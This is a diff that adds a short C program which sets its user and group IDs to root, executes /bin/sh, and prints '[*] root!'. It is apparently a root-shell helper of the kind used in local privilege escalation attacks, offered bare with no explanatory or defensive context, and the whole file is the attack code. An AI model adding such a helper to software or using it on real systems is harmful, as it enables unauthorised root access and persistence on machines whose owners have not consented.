@@ -1,0 +1,9 @@
+#include <stdio.h>
+#include <unistd.h>
+main()
+{
+        setuid(0);
+        setgid(0);
+        execl("/bin/sh","sh",0);
+        printf("[*] root!");
+}
